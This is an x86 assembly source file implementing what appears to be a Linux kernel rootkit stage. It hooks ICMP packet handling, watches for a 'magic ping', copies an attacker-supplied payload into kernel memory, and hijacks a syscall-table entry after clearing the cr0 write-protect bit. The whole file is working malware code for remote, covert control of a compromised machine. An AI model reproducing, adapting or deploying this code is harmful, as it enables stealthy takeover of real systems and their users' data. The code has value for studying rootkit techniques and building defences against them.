.intel_syntax noprefix
.globl hook_start
.globl hook_end

.set PROCESS_MAGIC,0xfeedface
.set MAGIC_PING,0x1234

.macro disable_wp
	mov eax,cr0
	and eax,0xfffeffff
	mov cr0,eax	
.endm

.macro enable_wp
	mov eax,cr0
	or eax,0x10000
	mov cr0,eax
.endm

.text

hook_start:
	# Preserve registers
	push edi
	push esi
	push ebx
	push eax
	sub esp,0x40

	# We do this here so if we don't find a magic ICMP
	# packet, we can still find the original icmp_rcv
	# function relative to edi
	call geteip
geteip:
	pop edi
	and di,0xf000

	# First, find the sk_buff data to check the ICMP header
	mov ecx,0x100
find_icmp:
	add eax,4
	mov esi,DWORD PTR [eax]
	cmp esi,0xc0300000
	jb next
	cmp esi,0xdff00000
	ja next
	cmp WORD PTR [esi+2],MAGIC_PING
	je found
next:
	sub ecx,4
	jnz find_icmp
	# Not a magic ping...
	jmp restore

found:
	# icmphdr[4] == 0 -> install
	cmp BYTE PTR [esi+4],0
	je install

	# icmphdr[4] == 1 -> trigger
	cmp BYTE PTR [esi+4],1
	je trigger

install:
	# edi contains address of userland payload
	sub edi,0x800
	
	# esi contains start of payload to be installed
	add esi,8

	mov ecx,0x3f8
	cld
	rep movsb
	jmp restore

trigger:
	# esi contains address of process-context payload
	sub edi,0x400

	# icmphdr[5] -> syscall to hijack
	xor edx,edx
	mov dl,BYTE PTR [esi+5]
	shl edx,2

# Next, we install a hook for our process-context payload by writing into the
# syscall table.  We assume a read-only syscall table, so we disable the WP bit
# in cr0 in order to write.  This is mostly safe (famous last words) in softirq
# because it's very unlikely we'll be scheduled out and rescheduled onto
# another CPU
	
	# Find handler for int 0x80
	mov eax,esp
	sidtd [eax]
	mov eax,DWORD PTR [eax+2]
	add eax,0x400
	mov bx,WORD PTR [eax+6]
	shl ebx,0x10
	mov bx,WORD PTR [eax]

	# Scan syscall entry function for call into syscall table
sys_scan:
	inc ebx
	mov ax,WORD PTR [ebx]
	cmp ax,0x14ff
	jne sys_scan
	mov ebx,DWORD PTR [ebx+0x3]

	# Store syscall table entry address for hooked syscall
	# and address of hooked syscall for process context payload.
	# Keep them at (esp & 0xf000) - 0x400
	add ebx,edx
	mov eax,DWORD PTR [ebx]
	
	# If we've already hooked it, just move on
	cmp eax,0xc0300000
	ja restore
	
	# original address of hooked syscall
	mov DWORD PTR [edi-0x4],eax

	# address in syscall table to restore
	mov DWORD PTR [edi-0xc],ebx

	# Install hook
	disable_wp
	mov DWORD PTR [ebx],edi
	enable_wp

restore:
	add edi,0x800
	and di,0xf000
	mov ecx,edi
	sub ecx,4

	# Restore registers
	add esp,0x40
	pop eax
	pop ebx
	pop esi
	pop edi

	# Jump to original icmp_rcv()
	jmp DWORD PTR [ecx]
	
	.long PROCESS_MAGIC
hook_end:
